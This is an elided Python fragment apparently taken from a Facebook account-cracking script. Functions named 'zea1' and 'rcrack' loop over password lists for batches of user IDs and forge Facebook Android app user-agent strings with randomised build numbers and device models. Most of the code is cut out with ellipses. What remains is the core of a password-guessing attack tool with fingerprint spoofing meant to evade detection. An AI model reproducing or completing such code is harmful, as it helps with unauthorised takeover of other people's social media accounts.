...
def zea1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua=[FBAN/FB4A;FBAV/FacebookAppVersion;FBBV/706310478;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/US;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/InfinixModel;FBSV/10.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            pro = "[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+str(random.randint(000000000,999999999))+';FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/'+fbcr+';FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            session = requests.Session()
